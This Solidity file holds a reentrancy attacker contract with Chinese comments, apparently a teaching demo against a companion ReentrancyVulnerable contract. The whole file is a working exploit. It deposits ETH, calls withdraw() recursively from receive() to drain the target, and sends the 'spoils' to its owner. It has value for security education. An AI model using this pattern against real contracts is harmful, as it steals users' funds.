// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./ReentrancyVulnerable.sol";

/**
 * @title ReentrancyAttacker
 * @notice 重入攻击合约
 * @dev 通过递归调用 withdraw() 耗尽目标合约资金
 */
contract ReentrancyAttacker {
    ReentrancyVulnerable public target;
    address public owner;
    uint256 public attackCount;
    uint256 public maxAttacks = 10;

    event AttackStarted(address target, uint256 initialDeposit);
    event ReentrancyTriggered(uint256 count, uint256 balance);
    event AttackFinished(uint256 totalStolen);

    constructor(address _target) {
        target = ReentrancyVulnerable(_target);
        owner = msg.sender;
    }

    /**
     * @notice 发起攻击：先存款，然后触发重入
     */
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        attackCount = 0;

        // 1. 存入资金获取提款资格
        target.deposit{value: msg.value}();

        emit AttackStarted(address(target), msg.value);

        // 2. 触发第一次提款，这将触发 receive() 递归
        target.withdraw();
    }

    /**
     * @notice 接收ETH时触发重入
     */
    receive() external payable {
        if (attackCount < maxAttacks && address(target).balance >= 1 ether) {
            attackCount++;
            emit ReentrancyTriggered(attackCount, address(target).balance);
            target.withdraw();
        }
    }

    /**
     * @notice 提取战利品
     */
    function collect() external {
        require(msg.sender == owner, "Not owner");
        uint256 bal = address(this).balance;
        (bool success, ) = owner.call{value: bal}("");
        require(success, "Transfer failed");
        emit AttackFinished(bal);
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
